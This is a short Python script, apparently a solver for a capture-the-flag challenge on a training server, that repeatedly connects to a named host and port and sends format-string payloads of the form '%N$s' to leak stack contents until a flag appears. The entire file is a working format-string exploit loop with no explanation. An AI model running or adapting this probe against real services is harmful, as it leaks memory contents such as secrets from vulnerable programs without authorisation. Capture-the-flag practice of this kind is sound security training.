import sys, socket, time, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "xebec.cylabacademy.net", 26615
for pos in range(1, 30):
    try:
        s = socket.create_connection((HOST, PORT), timeout=10)
        s.settimeout(4)
        time.sleep(0.4)
        try:
            s.recv(4096)
        except Exception:
            pass
        s.sendall(f"%{pos}$s\n".encode())
        time.sleep(0.6)
        out = b""
        try:
            out = s.recv(16384)
        except Exception:
            pass
        txt = out.decode("utf-8", "replace")
        body = txt.split("Here's a story - ")[-1] if "Here's a story" in txt else txt
        print(f"pos {pos}: {body[:120]!r}")
        m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
        if m:
            print("FLAG:", m.group(0))
            s.close()
            break
        s.close()
    except Exception as e:
        print(pos, "err", type(e).__name__)
